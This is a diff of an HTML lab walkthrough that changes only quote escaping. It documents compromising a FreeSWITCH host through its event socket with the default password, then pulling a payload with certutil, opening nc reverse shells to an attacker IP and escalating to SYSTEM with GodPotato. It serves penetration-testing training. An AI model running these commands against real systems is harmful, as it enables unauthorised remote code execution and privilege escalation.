@@ -590,7 +590,7 @@ password that shipped in the default configuration.</p>
 <hr />
 <h3>2.1 The handshake</h3>
 <p><strong>On Kali</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="o">{</span><span class="w"> </span><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;auth ClueCon\n\n&#39;</span><span class="p">;</span><span class="w"> </span>sleep<span class="w"> </span><span class="m">2</span><span class="p">;</span><span class="w"> </span><span class="nb">printf</span><span class="w"> </span><span class="s1">&#39;api system whoami\n\n&#39;</span><span class="p">;</span><span class="w"> </span>sleep<span class="w"> </span><span class="m">2</span><span class="p">;</span><span class="w"> </span><span class="o">}</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>timeout<span class="w"> </span><span class="m">10</span><span class="w"> </span>nc<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="m">8021</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="o">{</span><span class="w"> </span><span class="nb">printf</span><span class="w"> </span><span class="s1">'auth ClueCon\n\n'</span><span class="p">;</span><span class="w"> </span>sleep<span class="w"> </span><span class="m">2</span><span class="p">;</span><span class="w"> </span><span class="nb">printf</span><span class="w"> </span><span class="s1">'api system whoami\n\n'</span><span class="p">;</span><span class="w"> </span>sleep<span class="w"> </span><span class="m">2</span><span class="p">;</span><span class="w"> </span><span class="o">}</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>timeout<span class="w"> </span><span class="m">10</span><span class="w"> </span>nc<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="m">8021</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Content-Type: auth/request
 
@@ -648,8 +648,8 @@ password-protected. Neither control is in place.</p>
 <p>Every command in the rest of this walkthrough is sent through one small Python client, which is the
 public exploit for this version (<code>freeswitch-exploit.py</code>, author 1F98D) trimmed to a single call.
 Its whole working part is four steps:</p>
-<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="s1">&#39;auth </span><span class="si">{}</span><span class="se">\n\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s1">&#39;ClueCon&#39;</span><span class="p">),</span> <span class="s1">&#39;utf8&#39;</span><span class="p">))</span>
-<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="s1">&#39;api system </span><span class="si">{}</span><span class="se">\n\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">CMD</span><span class="p">),</span> <span class="s1">&#39;utf8&#39;</span><span class="p">))</span>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="s1">'auth </span><span class="si">{}</span><span class="se">\n\n</span><span class="s1">'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="s1">'ClueCon'</span><span class="p">),</span> <span class="s1">'utf8'</span><span class="p">))</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">bytes</span><span class="p">(</span><span class="s1">'api system </span><span class="si">{}</span><span class="se">\n\n</span><span class="s1">'</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">CMD</span><span class="p">),</span> <span class="s1">'utf8'</span><span class="p">))</span>
 <span class="n">response</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8096</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
 <span class="nb">print</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
 </pre></div>
@@ -659,8 +659,8 @@ one step and why the fix is a configuration change, not a patch.</p>
 <h3>2.4 What <code>-ERR no reply</code> means</h3>
 <p>The first attempts on this box were spent misreading the protocol, so it is worth writing down.</p>
 <p><strong>On Kali</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">&quot;pwd&quot;</span>
-python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">&quot;cd \scripts&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">"pwd"</span>
+python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">"cd \scripts"</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Authenticated
 Content-Type: api/response
@@ -696,7 +696,7 @@ fail completely and look identical to one that succeeded quietly. Every test fro
 written to produce observable stdout, and every redirect uses <code>2&gt;&amp;1</code>.</p>
 <p>The positive control is a command that does write to stdout:</p>
 <p><strong>On Kali</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">&quot;powershell&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">"powershell"</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Authenticated
 Content-Type: api/response
@@ -714,7 +714,7 @@ staged file therefore has to go to a temp path, and every reference to it must b
 the working directory does not survive between calls.</p>
 <h3>2.5 The exploit wrapper</h3>
 <p><code>tools/1.py</code> (in this directory) is that client. Every command block in this walkthrough reads:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span>&lt;target&gt;<span class="w"> </span><span class="s2">&quot;&lt;command&gt;&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span>&lt;target&gt;<span class="w"> </span><span class="s2">"&lt;command&gt;"</span>
 </pre></div>
 <p>with the target <code>192.168.137.151</code>. Because the command is sent as a single line terminated by a
 blank line, two characters need care:</p>
@@ -762,7 +762,7 @@ complications that shape every later command.</p>
 <hr />
 <h3>3.1 Who am I</h3>
 <p><strong>On Kali</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">"whoami"</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Authenticated
 Content-Type: api/response
@@ -777,8 +777,8 @@ trailing newline and the response is exactly the command output. When a later co
 Nothing survives: not the working directory, not environment changes, not background processes
 started in the foreground.</p>
 <p><strong>On Kali</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">&quot;cd \scripts&quot;</span>
-python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">&quot;cmd /c cd /d C:\Windows\Temp &amp; cd&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">"cd \scripts"</span>
+python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">"cmd /c cd /d C:\Windows\Temp &amp; cd"</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Authenticated
 Content-Type: api/response
@@ -805,7 +805,7 @@ debugging a payload twice.</p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4451</span>
 </pre></div>
 <p><strong>On Kali</strong> — the test through ESL, in another:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">&quot;powershell -nop -c \&quot;(New-Object Net.Sockets.TcpClient).Connect(&#39;192.168.45.158&#39;,4451);&#39;ok&#39;\&quot;&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">"powershell -nop -c \"(New-Object Net.Sockets.TcpClient).Connect('192.168.45.158',4451);'ok'\""</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Authenticated
 Content-Type: api/response
@@ -829,7 +829,7 @@ Windows build and does the job without PowerShell:</p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>mkdir<span class="w"> </span>-p<span class="w"> </span>~/www<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>~/www<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">8080</span>
 </pre></div>
 <p><strong>On Kali</strong> — pull it through ESL:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">&quot;certutil -f -urlcache http://192.168.45.158:8080/rev4446.ps1 C:\Users\chris\AppData\Local\Temp\rev4446.ps1&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">"certutil -f -urlcache http://192.168.45.158:8080/rev4446.ps1 C:\Users\chris\AppData\Local\Temp\rev4446.ps1"</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Authenticated
 Content-Type: api/response
@@ -839,7 +839,7 @@ Content-Length: 71
 CertUtil: -URLCache command completed successfully.</span></pre></div>
 <p>Then confirm the file exists rather than trusting the message:</p>
 <p><strong>On Kali</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">&quot;cmd /c dir C:\Users\chris\AppData\Local\Temp\rev4446.ps1&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">"cmd /c dir C:\Users\chris\AppData\Local\Temp\rev4446.ps1"</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain"> Volume in drive C has no label.
  Volume Serial Number is 949E-5CA2
@@ -861,7 +861,7 @@ shell:</p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4452</span>
 </pre></div>
 <p><strong>On Kali</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">&quot;cmd /c C:\Users\chris\AppData\Local\Temp\nc64.exe -e cmd.exe 192.168.45.158 4452&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">"cmd /c C:\Users\chris\AppData\Local\Temp\nc64.exe -e cmd.exe 192.168.45.158 4452"</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">listening on [any] 4452 ...
 connect to [192.168.45.158] from (UNKNOWN) [192.168.137.151] 51412
@@ -917,7 +917,7 @@ C:\Program Files\FreeSWITCH&gt;</span></pre></div>
 <h3>4.1 Identity and privileges</h3>
 <p><code>whoami /all</code> through the wrapper works, and unlike a bare <code>whoami</code> it prints to stdout reliably:</p>
 <p><strong>On Kali</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">&quot;powershell whoami /all&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">"powershell whoami /all"</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Authenticated
 Content-Type: api/response
@@ -1003,7 +1003,7 @@ needs, and what chapter 05 does.</p>
 there is no interactive desktop and no user profile loaded for a GUI session.</p>
 <h3>4.2 What is staged on the host</h3>
 <p><strong>On Kali</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">&quot;cmd /c dir /b C:\Users\chris\AppData\Local\Temp 2&gt;&amp;1&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">"cmd /c dir /b C:\Users\chris\AppData\Local\Temp 2&gt;&amp;1"</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Authenticated
 Content-Type: api/response
@@ -1063,7 +1063,7 @@ Potato variants (<code>GodPotato-NET4</code>, <code>JuicyPotatoNG</code>, <code>
 <h3>4.3 File access, and what it rules out</h3>
 <p>The user flag sits on <code>chris</code>'s own desktop and is readable:</p>
 <p><strong>On Kali</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">&quot;type C:\Users\chris\Desktop\local.txt 2&gt;&amp;1&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">"type C:\Users\chris\Desktop\local.txt 2&gt;&amp;1"</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Authenticated
 Content-Type: api/response
@@ -1072,7 +1072,7 @@ Content-Length: 33
 9d05eefc0447258ceab32e91e3b54aac</span></pre></div>
 <p>The administrator's desktop is a different story:</p>
 <p><strong>On Kali</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">&quot;type C:\Users\Administrator\Desktop\proof.txt 2&gt;&amp;1&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">"type C:\Users\Administrator\Desktop\proof.txt 2&gt;&amp;1"</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Authenticated
 Content-Type: api/response
@@ -1226,7 +1226,7 @@ step.</p>
 escalation does not stage anything or change directory — it asks GodPotato to run one <code>cmd.exe</code> as
 SYSTEM with the copy as its command, then reads the copy back <strong>as <code>chris</code></strong>, which is what proves
 the read happened at SYSTEM rather than being reported by the exploit:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">cd</span><span class="w"> </span>~/Desktop/Exploit<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">&quot;C:\Users\chris\AppData\Local\Temp\GodPotato-NET4.exe -cmd \&quot;cmd /c copy /y C:\Users\Administrator\Desktop\proof.txt C:\Users\chris\AppData\Local\Temp\proof_out.txt\&quot;&quot;</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;=== now reading as chris ===&quot;</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>sleep<span class="w"> </span><span class="m">2</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">&quot;type C:\Users\chris\AppData\Local\Temp\proof_out.txt 2&gt;&amp;1&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">cd</span><span class="w"> </span>~/Desktop/Exploit<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">"C:\Users\chris\AppData\Local\Temp\GodPotato-NET4.exe -cmd \"cmd /c copy /y C:\Users\Administrator\Desktop\proof.txt C:\Users\chris\AppData\Local\Temp\proof_out.txt\""</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"=== now reading as chris ==="</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>sleep<span class="w"> </span><span class="m">2</span><span class="w"> </span><span class="p">;</span><span class="w"> </span>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">"type C:\Users\chris\AppData\Local\Temp\proof_out.txt 2&gt;&amp;1"</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Authenticated
 Content-Type: api/response
@@ -1311,7 +1311,7 @@ failure is the most common way to abandon a working exploit.</p>
 <h3>5.4 Negative control</h3>
 <p>Same file, same wrapper, same account, no escalation:</p>
 <p><strong>On Kali</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">&quot;type C:\Users\Administrator\Desktop\proof.txt 2&gt;&amp;1&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">"type C:\Users\Administrator\Desktop\proof.txt 2&gt;&amp;1"</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Authenticated
 Content-Type: api/response
@@ -1365,7 +1365,7 @@ end; the failures were verified only by their absence of a connection.</p>
 <code>nc64.exe -e cmd.exe</code> child and not a script.</p>
 <p>One more trap, which produced a misleading result before it was understood:</p>
 <p><strong>On Kali</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">&quot;C:\Users\chris\AppData\Local\Temp\GodPotato-NET4.exe -cmd \&quot;cmd /c (echo USERNAME=%USERNAME% &amp; whoami.exe) &gt; C:\Users\chris\AppData\Local\Temp\id.txt 2&gt;&amp;1\&quot;&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">"C:\Users\chris\AppData\Local\Temp\GodPotato-NET4.exe -cmd \"cmd /c (echo USERNAME=%USERNAME% &amp; whoami.exe) &gt; C:\Users\chris\AppData\Local\Temp\id.txt 2&gt;&amp;1\""</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">USERNAME=chris</span></pre></div>
 <p><code>%USERNAME%</code> was expanded by the <strong>outer</strong> <code>cmd.exe</code> that FreeSWITCH spawned, before GodPotato ever
@@ -1378,7 +1378,7 @@ the child's own output, or use a check the escalation itself cannot fake (5.7).<
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4448</span>
 </pre></div>
 <p><strong>On Kali</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">&quot;C:\Users\chris\AppData\Local\Temp\GodPotato-NET4.exe -cmd \&quot;C:\Users\chris\AppData\Local\Temp\nc64.exe -e cmd.exe 192.168.45.158 4448\&quot;&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">"C:\Users\chris\AppData\Local\Temp\GodPotato-NET4.exe -cmd \"C:\Users\chris\AppData\Local\Temp\nc64.exe -e cmd.exe 192.168.45.158 4448\""</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">listening on [any] 4448 ...
 connect to [192.168.45.158] from (UNKNOWN) [192.168.137.151] 51358
@@ -1408,7 +1408,7 @@ HKEY_LOCAL_MACHINE\SECURITY\Policy\PolAdtEv
 service name is not resolved. And <code>HKLM\SECURITY</code> has an ACL that grants access to <strong>SYSTEM only</strong>.
 The same key, asked as <code>chris</code> through the wrapper:</p>
 <p><strong>On Kali</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">&quot;reg query HKLM\SECURITY\Policy\PolAdtEv 2&gt;&amp;1&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">"reg query HKLM\SECURITY\Policy\PolAdtEv 2&gt;&amp;1"</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Authenticated
 Content-Type: api/response
@@ -1451,7 +1451,7 @@ point: <code>local.txt</code> is not a privilege boundary on this box, <code>pro
 <p>The user flag is on the account's own desktop and readable through the event socket. The wrapper
 output for that read:</p>
 <p><strong>On Kali</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">&quot;type C:\Users\chris\Desktop\local.txt 2&gt;&amp;1&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">"type C:\Users\chris\Desktop\local.txt 2&gt;&amp;1"</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Authenticated
 Content-Type: api/response
@@ -1517,12 +1517,12 @@ recommendation short.</p>
 <p>Five files were created during the engagement. Everything else in <code>chris</code>'s temp directory was
 already there before the box was touched and is left alone.</p>
 <p><strong>On Kali</strong></p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">&quot;cmd /c del /q C:\Users\chris\AppData\Local\Temp\proof_out.txt C:\Users\chris\AppData\Local\Temp\rev4446.ps1 C:\Users\chris\AppData\Local\Temp\run4446.bat C:\Users\chris\AppData\Local\Temp\id.txt C:\Users\chris\AppData\Local\Temp\sys_out.txt 2&gt;&amp;1&quot;</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>python3<span class="w"> </span><span class="m">1</span>.py<span class="w"> </span><span class="m">192</span>.168.137.151<span class="w"> </span><span class="s2">"cmd /c del /q C:\Users\chris\AppData\Local\Temp\proof_out.txt C:\Users\chris\AppData\Local\Temp\rev4446.ps1 C:\Users\chris\AppData\Local\Temp\run4446.bat C:\Users\chris\AppData\Local\Temp\id.txt C:\Users\chris\AppData\Local\Temp\sys_out.txt 2&gt;&amp;1"</span>
 </pre></div>
 <p><code>del</code> prints nothing on success, so the reply is <code>-ERR no reply</code> — which, as chapter 02 established,
 is what a successful silent command looks like. Verify instead of assuming:</p>
 <p><strong>On Kali</strong></p>
